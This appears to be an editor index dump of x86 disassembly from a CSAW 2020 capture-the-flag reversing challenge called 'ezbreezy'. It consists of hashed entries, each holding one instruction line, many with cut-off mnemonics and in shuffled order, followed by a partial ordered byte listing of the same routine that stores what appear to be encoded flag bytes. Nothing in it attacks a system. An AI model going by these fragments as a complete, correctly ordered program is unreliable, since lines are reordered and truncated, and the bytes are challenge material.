	3c:   c6 45 fd 94             mov    BYTE PTR 
a50f3c9707a182c3a7f37997248e8eaf|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	55:   e9 a8 02 00 00          
30acb34166b3670916e97ed1d7f3fbd9|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	5e:   c7 45 fc 7c fe 14 00    mov    DWORD PTR 
9ab90baf293391b9efe6ed3bb3be589b|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	65:   81 7d fc 28 18 02 00    cmp    DWORD PTR 
fb990bad9d52654db115513937862cd8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	5a:   c6 45 fe 89             mov    BYTE PTR 
119a03654cf931bfef52082116ff8e98|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	6e:   b8 01 00 00 00          mov    
ccc89fdfb4960520460d7d2f2744248b|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	6c:   75 0a                   
b90bc4e7e126628d5551b8616df0e496|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	78:   c6 45 ff 8f             mov    BYTE PTR 
696b22680d35a0eefe9116ae61b1d8b0|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	73:   e9 8a 02 00 00          
b7ecfb281cb743aa693799690bd554db|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	7c:   c7 45 fc fa d3 06 00    mov    DWORD PTR 
9c3dbfc372743adb7e6e74ac90482f39|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	8a:   75 0a                   
233330d8499ac1f7ba8a3b7a7f7e4b38|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	8c:   b8 01 00 00 00          mov    
cb1f23990e130e8f8272ec95e37e1b4f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	83:   81 7d fc 70 50 03 00    cmp    DWORD PTR 
e304dc1d995e6250f4c355a24c73f3f4|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	91:   e9 6c 02 00 00          
c68fe2bf1415284d6fc6796ccd9aae38|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	96:   c6 45 00 a3             mov    BYTE PTR 
771af95ad9f0138ebe3f47d54f6cb8d7|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	9a:   c7 45 fc e2 b6 12 00    mov    DWORD PTR 
f612cb2a2aba7a29444b9e8eb1a2fc6f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	a8:   75 0a                   
08c821d68b06b8e31335d4c7aad03c5d|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	a1:   81 7d fc c6 0e 13 00    cmp    DWORD PTR 
6cfa223eec01fe08beba04801787ba6f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	aa:   b8 01 00 00 00          mov    
6f4abec010af4bad416d54a5f37f2417|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	af:   e9 4e 02 00 00          
dcc3b3a7d29188ee7cfed7dbcb7b6c44|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	b4:   c6 45 01 9d             mov    BYTE PTR 
2b31444b6ff191bdfc9450bc76ef3cea|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	b8:   c7 45 fc d7 46 0a 00    mov    DWORD PTR 
162268306620a69517846b4b0c8f1440|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	bf:   81 7d fc b8 e9 18 00    cmp    DWORD PTR 
5e433a375e94d572894e9df4c838ecf0|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	c6:   75 0a                   
f40ecfd59818f5bc0ef2ea2a6e009b1a|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	cd:   e9 30 02 00 00          
5c23369018c1ee2fdd62d3d2dea2816c|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	e4:   75 0a                   
677f17a7b7fb4d50126123ac58c0a3ac|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	d6:   c7 45 fc e7 f5 1b 00    mov    DWORD PTR 
d7eb3147dd04c9c6847707e0bd5b42e7|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	e6:   b8 01 00 00 00          mov    
692079143965cd171e6955c53ceb93d3|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	eb:   e9 12 02 00 00          
6b6a425c16f85f235313feb4600d1b6f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1e:   c6 45 fc 8e             mov    BYTE PTR 
3adf32867dd3f19a5f0b3b3bfc69b8a8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	f0:   c6 45 03 90             mov    BYTE PTR 
e93940c7e3b8b791353dbfc83febedd5|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	dd:   81 7d fc a1 b3 27 00    cmp    DWORD PTR 
7e3a92834705d0242570e639f1d96b8c|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	fb:   81 7d fc 63 8d 03 00    cmp    DWORD PTR 
87d060c5fca1047aaf00add0f3e64186|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	d2:   c6 45 02 87             mov    BYTE PTR 
8ef03f875eefd23b3baaa64310394d04|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	102:   75 0a                   
384d8f4d61b2d01cec63d9e272c475a6|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	104:   b8 01 00 00 00          mov    
d500382ec88caa4a51b4fdcce123fcc0|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	109:   e9 f4 01 00 00          
3b0721253568f5c43a60e20a6175c30a|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	112:   c7 45 fc 0d fe 09 00    mov    DWORD PTR 
5c57c5944cd7b905f753330ab87a0eec|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	119:   81 7d fc 2b 2f 02 00    cmp    DWORD PTR 
d5436f5286d9f526d19a97f8de857b37|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	120:   75 0a                   
2ea5486674fe96eae0f006038a5d1d5f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	f4:   c7 45 fc e5 e7 19 00    mov    DWORD PTR 
65c68aa39f86d179ffd57442ee13c8eb|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	122:   b8 01 00 00 00          mov    
d57630c3895363531e84b69dea87e16a|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	127:   e9 d6 01 00 00          
646fb0557f878459df23b19ec57ff85d|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	12c:   c6 45 05 9e             mov    BYTE PTR 
ce88d2d170e7146f8cfe7c4eea8ef6dd|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	130:   c7 45 fc bc 86 07 00    mov    DWORD PTR 
fe2bb0830f8ecdab6695fbd946a5b049|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	137:   81 7d fc ec 91 00 00    cmp    DWORD PTR 
d5b95f1eeed8f510851d9e79d9f63ad3|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	13e:   75 0a                   
198444177c978962ace389e7541125cb|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	140:   b8 01 00 00 00          mov    
3d47e000410408bc0828c7141d19a578|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	14a:   c6 45 06 5b             mov    BYTE PTR 
1dc21d9c99f3e518e2ae7f59c5bc2545|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	14e:   c7 45 fc a4 5a 05 00    mov    DWORD PTR 
621fc4c22102fef02092649875f9004f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	155:   81 7d fc d5 45 0e 00    cmp    DWORD PTR 
f24123bbc0b14a132bc0f955ffea5851|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	145:   e9 b8 01 00 00          
7b55be911232f32b45c4b70cf89b4459|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	15e:   b8 01 00 00 00          mov    
e714fb395d8fadd20f13f75813de28d8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	168:   c6 45 07 87             mov    BYTE PTR 
05ef13509962bc11d756e659eeb8572f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	163:   e9 9a 01 00 00          
aff999fb76a6c3b2e76f8a496b78a094|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	16c:   c7 45 fc a1 c1 15 00    mov    DWORD PTR 
0d7888d4983d092a6613ebb20b2a0243|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	173:   81 7d fc c4 f5 1c 00    cmp    DWORD PTR 
77276e580637293eb43bf8c4a4f6f5d7|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	17a:   75 0a                   
2ed89010c719f0df1ef11ecbb21637eb|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	17c:   b8 01 00 00 00          mov    
f7571a768e7e9e104dfa967629e0c12f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	186:   c6 45 08 9a             mov    BYTE PTR 
4baa6cf1a85046b735dd362bc9eee2de|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	15c:   75 0a                   
798ae9c2d68e5cc004cac77c65f57948|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	181:   e9 7c 01 00 00          
9ada3d111488b8f3092f0953e7b581a0|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	18a:   c7 45 fc 3a 16 0a 00    mov    DWORD PTR 
4fbc7e8957e13b1af2eb0d45c9bdd0e9|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	191:   81 7d fc 4a d1 1d 00    cmp    DWORD PTR 
7b03a28a7393b0b5f987f26814d275f5|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	198:   75 0a                   
397275c06e30a35497bcae1c5808b54c|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	19a:   b8 01 00 00 00          mov    
691d21bcf198b7eeee191359b6b87878|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	19f:   e9 5e 01 00 00          
d3f202ca855294d5b7c4d4cd1696ee0b|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1a4:   c6 45 09 5b             mov    BYTE PTR 
1f60a3b4f00f0081b8aeca4145c0e01a|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1a8:   c7 45 fc 33 c6 0a 00    mov    DWORD PTR 
8398da64c27f6be3b4a2d5c8c686f1df|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1b8:   b8 01 00 00 00          mov    
cc467a06c09e178ec0253b407cb83b97|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1af:   81 7d fc ea 0d 10 00    cmp    DWORD PTR 
9603108f693c6965e529d0792ffa0901|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1bd:   e9 40 01 00 00          
ef027f46d4e2a0d57ba27248ba29b981|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1b6:   75 0a                   
3f45b5c5e8f7117f2405e4205e544aed|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1c6:   c7 45 fc e1 81 1a 00    mov    DWORD PTR 
33ee74c20a8ff0a319a6c854c38ff995|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1cd:   81 7d fc 92 dc 1c 00    cmp    DWORD PTR 
14f14288617c3a41dd58f76a8a792298|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1d4:   75 0a                   
e00269decfd401698b614dd3283259ef|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1c2:   c6 45 0a 8b             mov    BYTE PTR 
c6d9d7007fb20b3a7afc38eb0a2dff35|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1d6:   b8 01 00 00 00          mov    
610279db9e4ced86c9fa7c4b8108ba4e|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1e0:   c6 45 0b 58             mov    BYTE PTR 
9e63b38b25e24c9092eaadb47493b9dc|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1db:   e9 22 01 00 00          
b9ff92360076976ea2fb76b7343467d2|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1e4:   c7 45 fc 11 52 0e 00    mov    DWORD PTR 
ae9f636549098369eb82e04ac574a8c7|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1eb:   81 7d fc 8b 93 04 00    cmp    DWORD PTR 
652add5367d4e5a111fa9ace02aafcb4|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1f2:   75 0a                   
1a53b3363bca989b31e573cf8b6a717f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1f4:   b8 01 00 00 00          mov    
cf922f05a631bbc1fae96251ad2700af|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1fe:   c6 45 0c 9e             mov    BYTE PTR 
49245763df97fdfa1fffbdf3267c5135|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1f9:   e9 04 01 00 00          
5539e0feed548fafa32fe740706cdecd|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	202:   c7 45 fc a8 31 1d 00    mov    DWORD PTR 
5104d8e3a8c8dfc0ff7c6d56efcad0d5|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	209:   81 7d fc 28 5b 13 00    cmp    DWORD PTR 
345c584168fa514d08fa9f155d1b876f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	210:   75 0a                   
bfa8c3672d245874c891335903d0982f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	217:   e9 e6 00 00 00          
a5dbd4c9d00e646d3accdf2f0876e100|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	1:   48                      
84968adcad29e7c4a41e9c7e0f1a4d2b|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	21c:   c6 45 0d 5b             mov    BYTE PTR 
b2557263a650707473eeb8a9f9977911|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	50:   b8 01 00 00 00          mov    
657164fd9ee5833cda01e864cfd3e052|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	c8:   b8 01 00 00 00          mov    
545bcf7346bace4789d09e028353e8e8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	212:   b8 01 00 00 00          mov    
2ad1a62675f119c0bcd38dc15de2b757|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	227:   81 7d fc 36 36 11 00    cmp    DWORD PTR 
206857faa2cf8aae542894de4366e23f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	22e:   75 0a                   
2c7035229c75ab99200ba03e8d17e561|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	230:   b8 01 00 00 00          mov    
f6201418dedbd85ae3e2f0d96ed7838a|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	235:   e9 c8 00 00 00          
7e0fe87cc98b75fa4565233038d6d5e9|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	23a:   c6 45 0e 9a             mov    BYTE PTR 
0197e87b60e0aa44be70e6ea5555d719|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	23e:   c7 45 fc bb b6 0d 00    mov    DWORD PTR 
5160f9c400199295df0e6dd722d036b1|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	24c:   75 0a                   
4f5935394a6c20200c1a7c95f8719560|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	245:   81 7d fc b9 af 20 00    cmp    DWORD PTR 
336ae949d1b236d6624620689334672f|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	24e:   b8 01 00 00 00          mov    
1338102a71272f93766ed3c08ebd7cc8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	253:   e9 aa 00 00 00          
2675e71088648de12e1c1037d86a4c16|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	258:   c6 45 0f 5b             mov    BYTE PTR 
06b5ef33907912d2640fc100ec7287a6|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	25c:   c7 45 fc 5d f2 06 00    mov    DWORD PTR 
28012197025ecff66e9fc9702a7820a8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	263:   81 7d fc 52 87 18 00    cmp    DWORD PTR 
5577b03883c4f909e6029730848e10c0|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	26a:   75 0a                   
4beb51977a088ea05c5fbc74b6b09161|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	26c:   b8 01 00 00 00          mov    
809549bebb9bafef624f636b961c81e1|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	271:   e9 8c 00 00 00          
c059a10133bc8e476d4cf783e4d13c69|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	276:   c6 45 10 8c             mov    BYTE PTR 
f940ec9854a84664a584998c45c4d006|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	27a:   c7 45 fc 12 f8 14 00    mov    DWORD PTR 
3b440a244d5d4fa2edc4fa3e79e12cc3|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	281:   81 7d fc a0 3d 0b 00    cmp    DWORD PTR 
64e2030de8200989d6513214aa6e2eb8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	288:   75 07                   
d0ad3a49778c365984db1d5684fdf9fc|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	28a:   b8 01 00 00 00          mov    
3590af8664ece8ad807a7b572abe7867|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	291:   c6 45 11 87             mov    BYTE PTR 
9a7587d3002620307e2a9412f0ec57dd|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	295:   c7 45 fc 62 9b 08 00    mov    DWORD PTR 
f4c6374d45f2d519f02d658d52d5b2ca|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	29c:   81 7d fc 60 11 13 00    cmp    DWORD PTR 
4bd12298f292debcd5ce7f9d19d57f60|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2a5:   b8 01 00 00 00          mov    
ca4c3d20dc5e8a2d3143375e3cc194cb|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2a3:   75 07                   
be9174374ae6f7a490a13ee4196f454a|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2aa:   eb 56                   
8ea75391539b4904bfd176bd7b557c37|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2b0:   c7 45 fc ba 3c 01 00    mov    DWORD PTR 
036b9095b5fb5cd38627edaa19c428e3|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2b7:   81 7d fc 8d 22 02 00    cmp    DWORD PTR 
0f201d7a5ef6fcbaecf6d6b81edf5168|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2ac:   c6 45 12 95             mov    BYTE PTR 
2c5c36a6fe8b8940ee77946c0e09479d|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2be:   75 07                   
1f8b7a02dab70235b29e11c3a9d50245|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	28f:   eb 71                   
338e1b7b194c8bc0fb9ab7d916b558ce|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2c0:   b8 01 00 00 00          mov    
e200b1e7586c8f3ef80472615154cd60|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2c7:   c6 45 13 5b             mov    BYTE PTR 
e89028fd2e0706aaaae339a49fa3a344|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2c5:   eb 3b                   
7c212de05f8bcf49179ed22094a831db|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2d2:   81 7d fc 45 b5 19 00    cmp    DWORD PTR 
991b733d523a9d683b58b92fa6f06ff8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2d9:   75 07                   
8d759ce6b7712214d0d2347d084feeb4|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2db:   b8 01 00 00 00          mov    
f85bab61d50dd5d3d06b26d978b78999|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2e2:   c6 45 14 a5             mov    BYTE PTR 
05b903df5364cfb6f6200bf3b3939fca|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2ed:   81 7d fc d2 79 24 00    cmp    DWORD PTR 
8a3ebbf4cd555e49a401b28b25a2fe1e|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2e6:   c7 45 fc 95 0b 05 00    mov    DWORD PTR 
deebb0f0cdb8bbd1a2b27bd89ad73bd5|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2e0:   eb 20                   
e864e81140ce433c6202a402a2c251a6|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2f4:   75 07                   
7bf81c336f542c23175d1f53a332d3c6|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2fb:   eb 05                   
3f5114a6382e8ca3087a7b40d0c402f4|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2f6:   b8 01 00 00 00          mov    
3cff5d5a152c026af9922de67b8834fc|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2fd:   b8 00 00 00 00          mov    
065c3aa911539f9e1de2fe2e7922f4db|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	302:   5d                      
de4a6d50e88c5b2d21f481a273ab8035|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	303:   
8917a1f2d081738a2e79f8d034930b04|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2cb:   c7 45 fc 81 a6 0c 00    mov    DWORD PTR 
13a35094ca6cb37248fafee9442ed2d5|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	220:   c7 45 fc 4b 10 0d 00    mov    DWORD PTR 
25975f71af73dba4c229302ef0186705|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	10e:   c6 45 04 5c             mov    BYTE PTR 
59dd6bab9fb6511f323c3e8e1f2f7190|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|1|1|^v|asm
	   0:   55                      
	   1:   48                      
	   2:   89 e5                   
	   4:   c7 45 fc 36 14 03 00    
	   b:   81 7d fc 5a 3f 00 00    
	  12:   75 0a                   
	  14:   b8 01 00 00 00          
	  19:   e9 e4 02 00 00          
	  1e:   c6 45 fc 8e             
	  22:   c7 45 fc a3 3c 09 00    
	  29:   81 7d fc ec 40 1f 00    
	  30:   75 0a                   
	  32:   b8 01 00 00 00          
	  37:   e9 c6 02 00 00          
	  3c:   c6 45 fd 94             
	  40:   c7 45 fc c9 7e 13 00    
	  47:   81 7d fc 47 fc 03 00    
	  4e:   75 0a                   
	  50:   b8 01 00 00 00          
	  55:   e9 a8 02 00 00          
	  5a:   c6 45 fe 89             
	  5e:   c7 45 fc 7c fe 14 00    
	  65:   81 7d fc 28 18 02 00    
	  6c:   75 0a                   
	  6e:   b8 01 00 00 00          
	  73:   e9 8a 02 00 00          
	  78:   c6 45 ff 8f             
	  7c:   c7 45 fc fa d3 06 00    
	  83:   81 7d fc 70 50 03 00    
	  8a:   75 0a                   
	  8c:   b8 01 00 00 00          
	  91:   e9 6c 02 00 00          
	  96:   c6 45 00 a3             
	  9a:   c7 45 fc e2 b6 12 00    
	  a1:   81 7d fc c6 0e 13 00    
	  a8:   75 0a                   
	  aa:   b8 01 00 00 00          
	  af:   e9 4e 02 00 00          
	  b4:   c6 45 01 9d             
	  b8:   c7 45 fc d7 46 0a 00    
	  bf:   81 7d fc b8 e9 18 00    
	  c6:   75 0a                   
	  c8:   b8 01 00 00 00          
	  cd:   e9 30 02 00 00          
	  d2:   c6 45 02 87             
	  d6:   c7 45 fc e7 f5 1b 00    
	  dd:   81 7d fc a1 b3 27 00    
	  e4:   75 0a                   
	  e6:   b8 01 00 00 00          
	  eb:   e9 12 02 00 00          
	  f0:   c6 45 03 90             
	  f4:   c7 45 fc e5 e7 19 00    
	  fb:   81 7d fc 63 8d 03 00    
	 102:   75 0a                   
	 104:   b8 01 00 00 00          
	 109:   e9 f4 01 00 00          
	 10e:   c6 45 04 5c             
	 112:   c7 45 fc 0d fe 09 00    
	 119:   81 7d fc 2b 2f 02 00    
	 120:   75 0a                   
	 122:   b8 01 00 00 00          
	 127:   e9 d6 01 00 00          
	 12c:   c6 45 05 9e             
	 130:   c7 45 fc bc 86 07 00    
	 137:   81 7d fc ec 91 00 00    
	 13e:   75 0a                   
	 140:   b8 01 00 00 00          
	 145:   e9 b8 01 00 00          
	 14a:   c6 45 06 5b             
	 14e:   c7 45 fc a4 5a 05 00    
	 155:   81 7d fc d5 45 0e 00    
	 15c:   75 0a                   
	 15e:   b8 01 00 00 00          
	 163:   e9 9a 01 00 00          
	 168:   c6 45 07 87             
	 16c:   c7 45 fc a1 c1 15 00    
	 173:   81 7d fc c4 f5 1c 00    
	 17a:   75 0a                   
	 17c:   b8 01 00 00 00          
	 181:   e9 7c 01 00 00          
	 186:   c6 45 08 9a             
	 18a:   c7 45 fc 3a 16 0a 00    
	 191:   81 7d fc 4a d1 1d 00    
	 198:   75 0a                   
	 19a:   b8 01 00 00 00          
	 19f:   e9 5e 01 00 00          
	 1a4:   c6 45 09 5b             
	 1a8:   c7 45 fc 33 c6 0a 00    
	 1af:   81 7d fc ea 0d 10 00    
	 1b6:   75 0a                   
	 1b8:   b8 01 00 00 00          
	 1bd:   e9 40 01 00 00          
	 1c2:   c6 45 0a 8b             
	 1c6:   c7 45 fc e1 81 1a 00    
	 1cd:   81 7d fc 92 dc 1c 00    
	 1d4:   75 0a                   
	 1d6:   b8 01 00 00 00          
	 1db:   e9 22 01 00 00          
	 1e0:   c6 45 0b 58             
	 1e4:   c7 45 fc 11 52 0e 00    
	 1eb:   81 7d fc 8b 93 04 00    
	 1f2:   75 0a                   
	 1f4:   b8 01 00 00 00          
	 1f9:   e9 04 01 00 00          
	 1fe:   c6 45 0c 9e             
	 202:   c7 45 fc a8 31 1d 00    
	 209:   81 7d fc 28 5b 13 00    
	 210:   75 0a                   
	 212:   b8 01 00 00 00          
	 217:   e9 e6 00 00 00          
	 21c:   c6 45 0d 5b             
	 220:   c7 45 fc 4b 10 0d 00    
	 227:   81 7d fc 36 36 11 00    
	 22e:   75 0a                   
	 230:   b8 01 00 00 00          
	 235:   e9 c8 00 00 00          
	 23a:   c6 45 0e 9a             
	 23e:   c7 45 fc bb b6 0d 00    
	 245:   81 7d fc b9 af 20 00    
	 24c:   75 0a                   
	 24e:   b8 01 00 00 00          
	 253:   e9 aa 00 00 00          
	 258:   c6 45 0f 5b             
	 25c:   c7 45 fc 5d f2 06 00    
	 263:   81 7d fc 52 87 18 00    
	 26a:   75 0a                   
	 26c:   b8 01 00 00 00          
	 271:   e9 8c 00 00 00          
	 276:   c6 45 10 8c             
	 27a:   c7 45 fc 12 f8 14 00    
	 281:   81 7d fc a0 3d 0b 00    
	 288:   75 07                   
	 28a:   b8 01 00 00 00          
	 28f:   eb 71                   
	 291:   c6 45 11 87             
